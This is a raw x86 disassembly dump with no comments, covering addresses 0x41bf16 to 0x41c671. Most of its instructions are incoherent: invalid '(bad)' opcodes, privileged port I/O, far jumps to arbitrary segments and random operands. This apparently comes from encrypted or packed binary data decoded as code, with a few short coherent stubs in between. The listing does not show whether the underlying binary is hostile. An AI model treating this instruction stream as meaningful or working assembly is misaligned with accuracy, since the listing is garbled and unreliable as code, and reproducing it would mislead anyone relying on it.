  41bf16:	in     al,dx
  41bf17:	push   es
  41bf18:	push   ecx
  41bf19:	inc    ebp
  41bf1a:	mov    ss,WORD PTR [ebx]
  41bf1c:	inc    edi
  41bf1d:	push   eax
  41bf1e:	arpl   WORD PTR [ebx-0x63],di
  41bf21:	mov    DWORD PTR [esp+eax*1],esp
  41bf24:	shl    DWORD PTR [esi-0x35],1
  41bf27:	mov    WORD PTR [edx],?
  41bf29:	mov    esi,edx
  41bf2b:	in     eax,0xf0
  41bf2d:	push   es
  41bf2e:	xchg   esp,eax
  41bf2f:	xchg   esp,eax
  41bf30:	(bad)  
  41bf31:	icebp  
  41bf32:	cmp    BYTE PTR [esi],0xa4
  41bf35:	(bad)  
  41bf36:	sahf   
  41bf37:	test   ebx,ebp
  41bf39:	xor    al,0x29
  41bf3b:	stc    
  41bf3c:	sub    eax,0xffc09aa3
  41bf41:	sbb    bh,BYTE PTR [esi+0x66]
  41bf44:	cdq    
  41bf45:	fdivp  st(7),st
  41bf47:	push   ss
  41bf48:	icebp  
  41bf49:	sbb    BYTE PTR [ebx],bl
  41bf4b:	pop    ecx
  41bf4c:	xor    BYTE PTR [ecx+ecx*8-0xe7e1891],0xc4
  41bf54:	and    DWORD PTR [esi-0x1a511cf3],ebx
  41bf5a:	inc    eax
  41bf5b:	fidivr WORD PTR [ebx-0x15]
  41bf5e:	mov    al,ds:0x278366d7
  41bf63:	or     al,0x91
  41bf65:	xor    DWORD PTR [esi],edi
  41bf67:	enter  0x2edf,0x5e
  41bf6b:	xchg   edi,eax
  41bf6c:	mov    ch,BYTE PTR [ebx]
  41bf6e:	sti    
  41bf6f:	push   eax
  41bf70:	stc    
  41bf71:	out    dx,al
  41bf72:	sub    al,0x41
  41bf74:	cmp    DWORD PTR [ebx],eax
  41bf76:	shl    DWORD PTR [eax],0xfc
  41bf79:	inc    ecx
  41bf7a:	mov    ch,0xef
  41bf7d:	ss jecxz 0x41bfd2
  41bf80:	les    ebp,FWORD PTR [eax]
  41bf82:	adc    edi,ebx
  41bf84:	test   DWORD PTR [eax+0x9d54d51],edi
  41bf8a:	xor    bh,BYTE PTR [ebx+0x1ca1c381]
  41bf90:	shl    DWORD PTR [eax+0x24],0x80
  41bf94:	jmp    0x662d:0x64c49847
  41bf9b:	push   cs
  41bf9c:	pushf  
  41bf9d:	das    
  41bf9e:	jbe    0x41bfd0
  41bfa0:	pop    ecx
  41bfa1:	mov    ebp,0xd8ed6075
  41bfa6:	mov    ebx,0xa03aa7d5
  41bfab:	lods   al,BYTE PTR ds:[esi]
  41bfac:	sahf   
  41bfad:	lahf   
  41bfae:	fwait
  41bfaf:	pushf  
  41bfb0:	mov    al,ds:0xfed57d61
  41bfb5:	lock repz int3 
  41bfb8:	mov    bl,0xd7
  41bfbb:	loope  0x41bf85
  41bfbd:	mov    BYTE PTR [ebp+0xa8c8d55],al
  41bfc3:	cwde   
  41bfc4:	jb     0x41bff8
  41bfc6:	add    BYTE PTR [ebx],bh
  41bfc8:	enter  0x850f,0x8d
  41bfcc:	hlt    
  41bfcd:	(bad)  
  41bfce:	dec    DWORD PTR [ebx+0x5e9de]
  41bfd4:	add    BYTE PTR [eax],al
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	imul   ebp,DWORD PTR [edi-0x28],0x23
  41bff3:	mov    eax,0x10787fe8
  41bff8:	jle    0x41c072
  41bffa:	js     0x41bff3
  41bffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bffd:	xor    dh,al
  41bfff:	popw   ds
  41c001:	lahf   
  41c002:	arpl   WORD PTR [esi-0x5765311d],si
  41c008:	cmp    dh,BYTE PTR [edi+0x1879f821]
  41c00e:	idiv   BYTE PTR [ebp+eiz*4-0x32]
  41c012:	adc    eax,0xcb8f8a8e
  41c017:	pop    edx
  41c018:	lahf   
  41c019:	out    dx,eax
  41c01a:	cld    
  41c01b:	in     al,0xec
  41c01d:	xchg   BYTE PTR [edi+ebp*2],dh
  41c020:	out    dx,al
  41c021:	xlat   BYTE PTR ds:[ebx]
  41c022:	rol    BYTE PTR [esi],0x55
  41c025:	push   edi
  41c026:	mov    al,ds:0x308ec85d
  41c02b:	scas   al,BYTE PTR es:[edi]
  41c02c:	jbe    0x41c007
  41c02e:	sub    eax,0x4c8d6ce1
  41c033:	ins    DWORD PTR es:[edi],dx
  41c034:	sar    dl,1
  41c036:	pop    ebx
  41c037:	pop    ebx
  41c038:	inc    esi
  41c039:	les    edi,FWORD PTR [eax-0x24037389]
  41c03f:	push   edi
  41c040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c041:	test   al,0x72
  41c043:	dec    ebp
  41c044:	add    cl,0xfd
  41c047:	js     0x41c088
  41c049:	push   ebp
  41c04a:	mov    ds:0xf033075e,al
  41c04f:	lock jo 0x41c005
  41c052:	retf   
  41c053:	inc    esi
  41c054:	je     0x41bfdd
  41c056:	jne    0x41bfeb
  41c058:	cmp    DWORD PTR [esi],esp
  41c05a:	push   0xffffffb9
  41c05c:	jmp    0x41c047
  41c05e:	loopne 0x41c035
  41c060:	push   ax
  41c062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c063:	les    ecx,FWORD PTR [ecx]
  41c065:	mov    DWORD PTR [ecx-0x78ffe990],eax
  41c06b:	dec    esi
  41c06c:	fwait
  41c06d:	cld    
  41c06e:	xchg   edi,eax
  41c06f:	ss loope 0x41c0bc
  41c072:	xor    ch,0xf8
  41c075:	mov    al,ds:0x83e8d9e5
  41c07a:	inc    esi
  41c07b:	fimul  DWORD PTR [eax+0x4f747453]
  41c081:	mov    bh,0x5e
  41c083:	cmp    BYTE PTR [ebx],0xcb
  41c086:	pop    esp
  41c087:	call   0xef834491
  41c08c:	add    edi,ebp
  41c08e:	jns    0x41c0d0
  41c090:	sub    al,BYTE PTR [edx-0x7c2efc91]
  41c096:	cwde   
  41c097:	inc    ebx
  41c098:	in     eax,dx
  41c099:	dec    eax
  41c09a:	mov    bl,0x71
  41c09c:	sub    eax,0xaf0d2ded
  41c0a1:	jle    0x41c03e
  41c0a3:	dec    esi
  41c0a4:	fdiv   st(7),st
  41c0a6:	repz cmp al,al
  41c0a9:	sub    BYTE PTR [ebx+0x2d19a716],dh
  41c0af:	xor    DWORD PTR [ebp-0x62],0xffffffaf
  41c0b3:	inc    ebp
  41c0b4:	test   DWORD PTR [esi],ebp
  41c0b6:	jne    0x41c136
  41c0b8:	xchg   ebx,eax
  41c0b9:	pop    ebx
  41c0ba:	ret    0xd4f5
  41c0bd:	adc    dh,BYTE PTR [esi-0x54665e75]
  41c0c3:	jl     0x41c0db
  41c0c5:	lods   eax,DWORD PTR ds:[esi]
  41c0c6:	pop    es
  41c0c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0c8:	jmp    0x64ead396
  41c0cd:	test   eax,0xbd769ccc
  41c0d2:	xor    dh,BYTE PTR [esi]
  41c0d4:	in     al,dx
  41c0d5:	dec    esp
  41c0d6:	mov    ds:0x3cebdfa6,al
  41c0db:	cmp    eax,0xc00b008f
  41c0e0:	pop    es
  41c0e1:	jb     0x41c13a
  41c0e3:	xchg   ebx,eax
  41c0e4:	add    ch,BYTE PTR [edx-0x46f59402]
  41c0ea:	mov    edx,0xadb40b7
  41c0ef:	mov    gs,WORD PTR [ebp-0x40]
  41c0f2:	pop    esp
  41c0f3:	mov    WORD PTR [edx-0x7d],ss
  41c0f6:	jge    0x41c07b
  41c0f8:	sbb    al,0x1f
  41c0fa:	int3   
  41c0fb:	stos   BYTE PTR es:[edi],al
  41c0fc:	xlat   BYTE PTR ds:[ebx]
  41c0fd:	xchg   ecx,eax
  41c0fe:	xchg   ebp,eax
  41c0ff:	or     al,0x7a
  41c102:	bound  ebx,QWORD PTR [edx-0x5f3d9e50]
  41c108:	xor    al,0x50
  41c10a:	inc    ecx
  41c10b:	push   edi
  41c10c:	pop    ebx
  41c10d:	popa   
  41c10e:	retf   
  41c10f:	pop    ds
  41c110:	cmp    al,0xa3
  41c112:	nop
  41c113:	daa    
  41c114:	mov    ds:0xa7277bd2,al
  41c119:	dec    edi
  41c11a:	clc    
  41c11b:	ins    BYTE PTR es:[edi],dx
  41c11c:	stos   DWORD PTR es:[edi],eax
  41c11d:	push   ss
  41c11e:	daa    
  41c11f:	popa   
  41c120:	sbb    al,0x12
  41c122:	pop    ds
  41c123:	call   0x5662:0xafe9a6f2
  41c12a:	fs or  eax,0x72cd6c31
  41c130:	stc    
  41c131:	repz jmp 0x7e7d:0x84ec2562
  41c139:	int3   
  41c13a:	adc    ch,BYTE PTR [esp+eax*2-0x6d86e8c8]
  41c141:	lahf   
  41c142:	imul   edi,DWORD PTR [eax+0x66],0xd63ceb4e
  41c149:	dec    esi
  41c14a:	dec    ecx
  41c14b:	test   BYTE PTR [ecx-0x6117c4a0],bl
  41c151:	and    ah,BYTE PTR [edx+eiz*1+0x2b0ca412]
  41c158:	dec    ebp
  41c159:	or     al,0xd8
  41c15b:	mov    DWORD PTR [eax-0x6b],ecx
  41c15e:	not    BYTE PTR [edx*8-0x5d727353]
  41c165:	sub    esi,DWORD PTR [esp+ebp*1]
  41c168:	xor    eax,0x5cd804c
  41c16d:	aad    0x66
  41c16f:	and    dl,BYTE PTR [ecx-0x2e]
  41c172:	outs   dx,BYTE PTR ds:[esi]
  41c173:	out    dx,al
  41c174:	ret    
  41c175:	out    0xfc,al
  41c177:	jno    0x41c1f3
  41c179:	(bad)  
  41c17a:	fnsave [esi+0x6e]
  41c17d:	sbb    BYTE PTR [eax-0x71],bl
  41c180:	fmul   st(3),st
  41c182:	adc    ah,BYTE PTR [ecx+0x27]
  41c185:	push   edx
  41c186:	and    DWORD PTR [ecx],edi
  41c188:	pop    edi
  41c189:	icebp  
  41c18a:	pop    ebp
  41c18b:	pop    esp
  41c18c:	fst    QWORD PTR [edi-0x21373f8c]
  41c192:	and    bl,BYTE PTR [ebx+eax*1+0x4467be25]
  41c199:	bound  esp,QWORD PTR [ebx-0x3a7c7f]
  41c19f:	and    eax,0x9883f7ec
  41c1a4:	daa    
  41c1a5:	sub    BYTE PTR [eax+0x1859379c],ch
  41c1ab:	call   0xe09cc5c2
  41c1b0:	jo     0x41c21c
  41c1b2:	retf   
  41c1b3:	loope  0x41c203
  41c1b5:	lahf   
  41c1b6:	arpl   WORD PTR [ebp-0x1852007d],cx
  41c1bc:	jno    0x41c1d8
  41c1be:	sahf   
  41c1bf:	ja     0x41c193
  41c1c1:	test   DWORD PTR [eax+0x76],edx
  41c1c4:	cmp    al,0xf
  41c1c6:	inc    ebx
  41c1c7:	xor    edx,DWORD PTR [eax+0x1de8d8b5]
  41c1cd:	lods   eax,DWORD PTR ds:[esi]
  41c1ce:	lods   al,BYTE PTR ds:[esi]
  41c1cf:	ds cld 
  41c1d1:	pop    edi
  41c1d2:	xchg   ebp,eax
  41c1d3:	cmp    DWORD PTR [edi-0x30],esp
  41c1d6:	sbb    eax,0x89751926
  41c1db:	push   edi
  41c1dc:	call   0xc3071e88
  41c1e1:	xchg   esp,eax
  41c1e2:	adc    bh,cl
  41c1e4:	xlat   BYTE PTR ds:[ebx]
  41c1e5:	data16 lock hlt 
  41c1e8:	(bad)  
  41c1ea:	ins    DWORD PTR es:[edi],dx
  41c1eb:	xchg   esp,eax
  41c1ec:	push   ds
  41c1ed:	cmp    eax,0xf254b39
  41c1f2:	data16 mov bl,0x98
  41c1f5:	xchg   esp,eax
  41c1f6:	lods   eax,DWORD PTR ds:[esi]
  41c1f7:	sbb    BYTE PTR [edi-0x71],al
  41c1fa:	pop    edi
  41c1fb:	pop    es
  41c1fc:	dec    esp
  41c1fd:	(bad)  
  41c1fe:	push   ebp
  41c1ff:	mov    bh,0xde
  41c201:	pusha  
  41c202:	xchg   esi,eax
  41c203:	sar    BYTE PTR [ebx],cl
  41c205:	out    0xc3,eax
  41c207:	or     DWORD PTR [eax+0x4753440a],eax
  41c20d:	inc    eax
  41c20e:	cli    
  41c20f:	dec    edx
  41c210:	xlat   BYTE PTR ds:[ebx]
  41c211:	nop
  41c212:	aam    0x35
  41c214:	push   eax
  41c215:	or     BYTE PTR [ecx+0x7],dl
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	loope  0x41c25e
  41c22d:	pop    esp
  41c22e:	std    
  41c22f:	push   eax
  41c230:	out    dx,al
  41c231:	jg     0x41c2ab
  41c233:	adc    BYTE PTR [esi+0x78],bh
  41c236:	js     0x41c299
  41c238:	retf   
  41c239:	scas   al,BYTE PTR es:[edi]
  41c23a:	dec    ebx
  41c23b:	mov    edx,0x99502454
  41c240:	daa    
  41c241:	iret   
  41c242:	or     ecx,DWORD PTR [esi+0x2c]
  41c245:	cmp    al,0xce
  41c247:	xor    bl,0x31
  41c24a:	xlat   BYTE PTR ds:[ebx]
  41c24b:	pop    esp
  41c24c:	jae    0x41c27a
  41c24e:	inc    esi
  41c24f:	cmp    esi,DWORD PTR [edi-0x45ba657d]
  41c255:	mov    dl,0xd9
  41c257:	mov    bl,0x6b
  41c259:	jge    0x41c208
  41c25b:	mov    al,0x73
  41c25d:	mov    esp,0x869a7328
  41c262:	sbb    al,0x60
  41c264:	inc    esi
  41c265:	pop    edx
  41c266:	sub    esp,esi
  41c268:	add    edx,DWORD PTR [eax-0x11]
  41c26b:	(bad)  
  41c26c:	sub    eax,0xa7d5a24d
  41c271:	dec    ecx
  41c272:	mov    BYTE PTR [esp+ebp*4+0x58c8ab94],ch
  41c279:	loopne 0x41c229
  41c27b:	sub    esp,esi
  41c27d:	retf   0x3f98
  41c280:	call   0xc0067638
  41c285:	xchg   ebp,edx
  41c287:	mov    ds:0x486d8aaa,eax
  41c28c:	push   0x29
  41c28e:	lds    ebp,FWORD PTR [eax-0x6ed21671]
  41c294:	pushf  
  41c295:	mov    al,BYTE PTR [edi+0x4a]
  41c298:	dec    ebp
  41c299:	test   DWORD PTR [esi+0x7d],eax
  41c29c:	xor    bl,BYTE PTR [edx-0x40]
  41c29f:	mov    ecx,0x1960fdad
  41c2a4:	sbb    al,0xd2
  41c2a6:	leave  
  41c2a7:	jge    0x41c318
  41c2a9:	lock outs dx,BYTE PTR ds:[esi]
  41c2ab:	mov    bh,0xdb
  41c2ad:	or     eax,0xa9825550
  41c2b2:	in     eax,0xec
  41c2b4:	test   DWORD PTR [edi],0x66e798d0
  41c2ba:	adc    BYTE PTR [edi],0x93
  41c2bd:	test   al,0x5d
  41c2bf:	pop    ss
  41c2c0:	jp     0x41c316
  41c2c2:	(bad)  [edi+eiz*2+0x38]
  41c2c6:	xlat   BYTE PTR ds:[ebx]
  41c2c7:	les    esi,FWORD PTR [edi-0x6f431b5b]
  41c2cd:	nop    DWORD PTR [ebp-0x2e]
  41c2d1:	add    al,0xf7
  41c2d3:	shl    BYTE PTR [esi-0x19],1
  41c2d6:	dec    esp
  41c2d7:	mov    bl,0x95
  41c2d9:	xchg   ebp,eax
  41c2da:	jb     0x41c2fe
  41c2dc:	ins    BYTE PTR es:[edi],dx
  41c2dd:	xchg   esp,eax
  41c2de:	sub    al,0x1e
  41c2e0:	out    dx,al
  41c2e1:	fcomp  DWORD PTR [edi-0x2f5a9059]
  41c2e7:	and    bl,BYTE PTR [ebp+ebx*8+0x59]
  41c2eb:	mov    ds:0xb8e4e6ec,al
  41c2f0:	fmul   st,st(3)
  41c2f2:	push   ebp
  41c2f3:	or     dl,BYTE PTR [esi-0x5cc39d02]
  41c2f9:	dec    edi
  41c2fa:	mov    ds:0xdd43c340,eax
  41c2ff:	cmc    
  41c300:	dec    eax
  41c301:	ror    BYTE PTR [ecx],1
  41c303:	add    ch,BYTE PTR [edi+0x32dede11]
  41c309:	push   esp
  41c30a:	push   0xffffffbe
  41c30c:	mov    WORD PTR [edx+0x1f],?
  41c30f:	hlt    
  41c310:	push   ss
  41c311:	jmp    0x76aa4362
  41c316:	out    0x7,eax
  41c318:	and    edx,edi
  41c31a:	pop    esi
  41c31b:	aam    0x9a
  41c31d:	int3   
  41c31e:	push   ss
  41c31f:	aam    0xf6
  41c321:	arpl   di,bx
  41c323:	xor    eax,0x13394399
  41c328:	mov    al,ds:0xd3dfadcc
  41c32d:	imul   ebp,ebp,0xf3c50075
  41c333:	sbb    al,0xea
  41c335:	in     al,dx
  41c336:	outs   dx,BYTE PTR ds:[esi]
  41c337:	xor    ch,BYTE PTR [edi]
  41c339:	pop    ss
  41c33a:	jmp    0x42e72aa1
  41c33f:	push   edx
  41c340:	adc    al,0x53
  41c342:	les    esi,FWORD PTR [eax-0x11f8e0b4]
  41c348:	fimul  WORD PTR [bx+di-0x1ae2]
  41c34d:	xor    BYTE PTR [esi],bl
  41c34f:	mov    cl,0x6b
  41c351:	fs jl  0x41c306
  41c354:	sbb    esi,ecx
  41c356:	sahf   
  41c357:	push   es
  41c358:	fcmove st,st(5)
  41c35a:	sub    BYTE PTR [edi-0x47],ch
  41c35d:	or     DWORD PTR [edi],eax
  41c35f:	fldlg2 
  41c361:	jo     0x41c36e
  41c363:	pushf  
  41c364:	add    ch,BYTE PTR [edi-0x6363e21e]
  41c36a:	xchg   ebx,eax
  41c36b:	cmp    eax,0x2db95a66
  41c370:	adc    al,0x5e
  41c372:	mov    dh,0xf2
  41c374:	rcl    ah,cl
  41c376:	inc    esi
  41c377:	pmullw mm5,mm4
  41c37a:	ins    BYTE PTR es:[edi],dx
  41c37b:	bound  esp,QWORD PTR [ebx]
  41c37d:	mov    ds:0xe1ae9663,eax
  41c382:	stc    
  41c383:	test   BYTE PTR [edi+0x499a9c90],cl
  41c389:	pop    edx
  41c38a:	or     al,0xa9
  41c38c:	imul   ecx,DWORD PTR [edi],0xfea21157
  41c392:	xchg   DWORD PTR [edx+0x3c],edi
  41c395:	(bad)  
  41c396:	in     al,0xa0
  41c398:	test   BYTE PTR [edx-0x3d6b0b51],dl
  41c39e:	and    ecx,DWORD PTR [ecx+0x71b188dc]
  41c3a4:	cmc    
  41c3a5:	mov    esp,DWORD PTR cs:[edx+0x7e]
  41c3a9:	arpl   WORD PTR [eax],ax
  41c3ab:	es out 0x10,eax
  41c3ae:	push   edx
  41c3af:	ret    
  41c3b0:	adc    bl,BYTE PTR [bx+si+0x1e]
  41c3b4:	aaa    
  41c3b5:	outs   dx,DWORD PTR ds:[esi]
  41c3b6:	cmc    
  41c3b7:	xchg   edi,eax
  41c3b8:	cdq    
  41c3b9:	sbb    esp,DWORD PTR [ebx]
  41c3bb:	sub    al,0xbc
  41c3bd:	lods   al,BYTE PTR ds:[esi]
  41c3be:	adc    eax,esp
  41c3c0:	call   0xf379:0xeae9a171
  41c3c7:	push   esp
  41c3c8:	loopne 0x41c3d8
  41c3ca:	rol    cl,1
  41c3cc:	push   ds
  41c3cd:	adc    ch,BYTE PTR [eax+0x60f8ddea]
  41c3d3:	or     eax,DWORD PTR [eax]
  41c3d5:	jae    0x41c406
  41c3d7:	ins    DWORD PTR es:[edi],dx
  41c3d8:	push   0xa
  41c3da:	ror    BYTE PTR [ecx],cl
  41c3dc:	push   0xf4dcfc7e
  41c3e1:	mov    BYTE PTR [edx],dh
  41c3e3:	fwait
  41c3e4:	xor    eax,0xe98966ed
  41c3e9:	stos   DWORD PTR es:[edi],eax
  41c3ea:	retf   
  41c3eb:	add    BYTE PTR [edx+edx*1+0x2c08b454],dl
  41c3f2:	lds    eax,FWORD PTR [ebp+0x75]
  41c3f5:	inc    eax
  41c3f6:	cdq    
  41c3f7:	or     DWORD PTR [eax+0x55],ebx
  41c3fa:	clc    
  41c3fb:	lods   al,BYTE PTR ds:[esi]
  41c3fc:	cmp    DWORD PTR [edi+eax*1-0x7a0b4ac2],edi
  41c403:	mov    ah,0x79
  41c405:	adc    eax,0x47a7cf95
  41c40a:	sti    
  41c40b:	sar    BYTE PTR [eax],cl
  41c40d:	jo     0x41c3ea
  41c40f:	pop    esi
  41c410:	mov    ah,0x5d
  41c412:	repnz in al,dx
  41c414:	(bad)
  41c417:	(bad)  
  41c418:	dec    eax
  41c419:	dec    ecx
  41c41a:	dec    esp
  41c41b:	gs xchg esi,eax
  41c41d:	xchg   esi,eax
  41c41e:	mov    cl,0x34
  41c420:	push   ebx
  41c421:	xchg   edi,eax
  41c422:	cs cs cs sbb al,0x1f
  41c427:	jle    0x41c3e9
  41c429:	lock je 0x41c3cc
  41c42c:	retf   
  41c42d:	enter  0xbfc7,0x4a
  41c431:	sub    BYTE PTR [ebx-0x3d3dfc71],dh
  41c437:	iret   
  41c438:	push   ss
  41c439:	xor    ebx,ebp
  41c43b:	aam    0xa3
  41c43d:	loope  0x41c443
  41c43f:	pop    ds
  41c440:	sahf   
  41c441:	xor    esi,DWORD PTR [ebp+0x7f088d4f]
  41c447:	inc    esi
  41c448:	jmp    0x41c445
  41c44a:	retf   0xfd57
  41c44d:	jecxz  0x41c429
  41c44f:	mov    DWORD PTR [ebp-0xc],eax
  41c452:	jmp    0x41c687
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c498
  41c464:	mov    ch,BYTE PTR [ecx-0x56]
  41c467:	push   0x10787fec
  41c46c:	jle    0x41c4e6
  41c46e:	js     0x41c4ec
  41c470:	add    esp,DWORD PTR [edi+0x29ec1948]
  41c476:	pushf  
  41c477:	fwait
  41c478:	mov    eax,ds:0xae7ff5e4
  41c47d:	or     al,al
  41c47f:	test   eax,0x7a5249b7
  41c484:	fsubr  st,st(3)
  41c486:	jecxz  0x41c469
  41c488:	push   esp
  41c489:	arpl   WORD PTR [edx+0x2739439],di
  41c48f:	cmp    al,0xe0
  41c491:	inc    ecx
  41c492:	inc    ecx
  41c493:	add    al,0x55
  41c495:	pop    ecx
  41c496:	shl    ecx,0xb5
  41c499:	add    edi,DWORD PTR [ecx+0x4c95104b]
  41c49f:	xchg   edx,eax
  41c4a0:	arpl   si,dx
  41c4a2:	popf   
  41c4a3:	daa    
  41c4a4:	aaa    
  41c4a5:	sbb    cl,BYTE PTR [ecx]
  41c4a7:	das    
  41c4a8:	(bad)  
  41c4a9:	jmp    0x41c4b8
  41c4ab:	je     0x41c438
  41c4ad:	pop    ecx
  41c4ae:	(bad)  [ebx+0x507c2a9d]
  41c4b4:	jbe    0x41c44d
  41c4b6:	scas   eax,DWORD PTR es:[edi]
  41c4b7:	cmp    dh,bh
  41c4b9:	ja     0x41c500
  41c4bb:	jl     0x41c506
  41c4bd:	retf   0x697c
  41c4c0:	xor    dl,BYTE PTR [esp+ecx*8]
  41c4c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4c4:	dec    edx
  41c4c5:	pop    ds
  41c4c6:	jno    0x41c52d
  41c4c8:	mov    esp,0x5bbb5211
  41c4cd:	daa    
  41c4ce:	ss dec eax
  41c4d0:	sbb    ah,BYTE PTR [esi+0x57b94866]
  41c4d6:	mov    eax,0x10c0176c
  41c4db:	push   esi
  41c4dc:	bound  esi,QWORD PTR [edx]
  41c4de:	lea    esp,[esi-0x38]
  41c4e1:	scas   al,BYTE PTR es:[edi]
  41c4e2:	into   
  41c4e3:	inc    ecx
  41c4e4:	repnz inc ebx
  41c4e6:	(bad)  
  41c4e7:	dec    ebp
  41c4e8:	mov    esi,DWORD PTR [ecx]
  41c4ea:	fwait
  41c4eb:	ins    DWORD PTR es:[edi],dx
  41c4ec:	call   0x2c19:0x7d2d95b0
  41c4f3:	and    DWORD PTR [edx-0x36],esi
  41c4f6:	mov    eax,0xe892b
  41c4fb:	nop
  41c4fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4fd:	adc    ch,BYTE PTR [eax+esi*2-0x11]
  41c501:	stc    
  41c502:	or     DWORD PTR ds:0xc9232b4a,esp
  41c508:	add    ch,ch
  41c50a:	xor    esp,ebp
  41c50c:	outs   dx,DWORD PTR ds:[esi]
  41c50d:	push   ds
  41c50e:	mov    DWORD PTR [esi],esi
  41c510:	mov    ecx,0xe7ebcb33
  41c515:	fimul  WORD PTR [edx]
  41c517:	mov    edx,0x4cf4ec46
  41c51c:	adc    BYTE PTR [esi+0x3350c657],0x93
  41c523:	in     eax,0xc3
  41c525:	bound  ecx,QWORD PTR [ecx]
  41c527:	sbb    DWORD PTR [ebx],ebx
  41c529:	sbb    eax,DWORD PTR [esi]
  41c52b:	popf   
  41c52c:	lods   eax,DWORD PTR es:[esi]
  41c52e:	das    
  41c52f:	(bad)  
  41c530:	das    
  41c531:	cmp    eax,0x9034579d
  41c536:	and    al,0x95
  41c538:	imul   ebp,DWORD PTR [ebx-0x3d0e3845],0x7b8d0c3
  41c542:	scas   al,BYTE PTR es:[edi]
  41c543:	data16 int3 
  41c545:	mov    WORD PTR [edx+0x6cc8ae86],fs
  41c54b:	or     BYTE PTR [esi+0x1b],dl
  41c54e:	int    0x10
  41c550:	int    0xfd
  41c552:	add    al,0x93
  41c554:	cmp    ecx,DWORD PTR [esi+0x12]
  41c557:	dec    edi
  41c558:	xor    BYTE PTR [edx+ebx*8],ah
  41c55b:	out    0xd2,al
  41c55d:	test   ebp,edx
  41c55f:	adc    ch,BYTE PTR [edi+0x66f6df8c]
  41c565:	pop    ss
  41c566:	push   esi
  41c567:	test   eax,0xbfc053ac
  41c56c:	fs leave 
  41c56e:	xor    BYTE PTR [eax-0x12],dl
  41c571:	jg     0x41c5bc
  41c573:	jge    0x41c54e
  41c575:	mov    ecx,0xc72f256c
  41c57a:	(bad)  
  41c57c:	fisubr DWORD PTR [edi-0x45]
  41c57f:	nop
  41c580:	jb     0x41c5d9
  41c582:	xor    DWORD PTR [edx+0x6b05597b],0x2aa06840
  41c58c:	xchg   edx,eax
  41c58d:	sbb    al,0xfa
  41c58f:	fsub   DWORD PTR [edx+0x4b]
  41c592:	call   FWORD PTR [edi-0x59]
  41c595:	pop    ebp
  41c596:	xor    al,0x40
  41c598:	or     DWORD PTR [esi+ecx*1+0x7d],esp
  41c59c:	push   ss
  41c59d:	pushf  
  41c59e:	ins    DWORD PTR es:[edi],dx
  41c59f:	and    eax,0xec4a1003
  41c5a4:	lds    si,DWORD PTR [edi]
  41c5a7:	iret   
  41c5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5a9:	mov    ah,0xfd
  41c5ab:	and    DWORD PTR [edi],0xc5fbae3d
  41c5b1:	loope  0x41c5c0
  41c5b3:	icebp  
  41c5b4:	sub    eax,0x587802c7
  41c5b9:	pop    eax
  41c5ba:	jb     0x41c54e
  41c5bc:	jno    0x41c5a4
  41c5be:	sub    al,0xe6
  41c5c0:	and    BYTE PTR [edi],al
  41c5c2:	sub    edx,DWORD PTR [eax]
  41c5c4:	mov    cl,BYTE PTR [esi+0x6d]
  41c5c7:	jnp    0x41c628
  41c5c9:	inc    ecx
  41c5ca:	sbb    BYTE PTR [eax+0x6b],0x24
  41c5ce:	xor    DWORD PTR [edx],ecx
  41c5d0:	int    0x42
  41c5d2:	in     eax,0x25
  41c5d4:	pop    edi
  41c5d5:	cmp    eax,0xbfd07b26
  41c5da:	ror    DWORD PTR [ebp-0x1dd40425],1
  41c5e0:	xlat   BYTE PTR ds:[ebx]
  41c5e1:	mov    esp,0x9a01a22
  41c5e6:	push   ss
  41c5e7:	icebp  
  41c5e8:	das    
  41c5e9:	es call 0x8bb263e4
  41c5ef:	dec    edx
  41c5f0:	out    0x33,al
  41c5f2:	push   0xffffffac
  41c5f4:	jl     0x41c600
  41c5f6:	cmp    DWORD PTR [edx+0x3c2e1278],0x79871a96
  41c600:	test   ah,cl
  41c602:	pop    ecx
  41c603:	cld    
  41c604:	retf   0x5f50
  41c607:	xor    ah,ah
  41c609:	sahf   
  41c60a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c60b:	dec    ebp
  41c60c:	mov    ah,0x9d
  41c60e:	push   0x3a
  41c610:	ret    0x1940
  41c613:	gs enter 0xfb5b,0x32
  41c618:	stos   DWORD PTR es:[edi],eax
  41c619:	sub    al,0x7b
  41c61b:	pusha  
  41c61c:	(bad)  [eax-0x56]
  41c61f:	mov    esp,0xcd6b129
  41c624:	dec    edi
  41c625:	mov    ds:0x392d6634,eax
  41c62a:	cmp    ah,BYTE PTR [ebp-0x18]
  41c62d:	mov    esp,0xe5edb11f
  41c632:	or     eax,0x67431d29
  41c637:	repz iret 
  41c639:	ret    
  41c63a:	mov    eax,ds:0xf3b1cc8f
  41c63f:	xchg   ecx,eax
  41c640:	or     DWORD PTR [eax-0x1a3be77f],esi
  41c646:	sub    bl,BYTE PTR [eax-0x18]
  41c649:	and    al,0xf1
  41c64b:	xlat   BYTE PTR ds:[ebx]
  41c64c:	mov    cl,0xfa
  41c64e:	aaa    
  41c64f:	call   edi
  41c651:	data16 jecxz 0x41c620
  41c654:	test   eax,0x14c21479
  41c659:	and    DWORD PTR [esi+0x275af07],edx
  41c65f:	mov    ah,BYTE PTR ds:0xe6b2f343
  41c665:	outs   dx,DWORD PTR ds:[esi]
  41c666:	fiadd  WORD PTR [edx-0x9]
  41c669:	adc    al,ah
  41c66b:	scas   al,BYTE PTR es:[edi]
  41c66c:	or     eax,0xb0a65f0
  41c671:	test   eax,0xa10e9b41
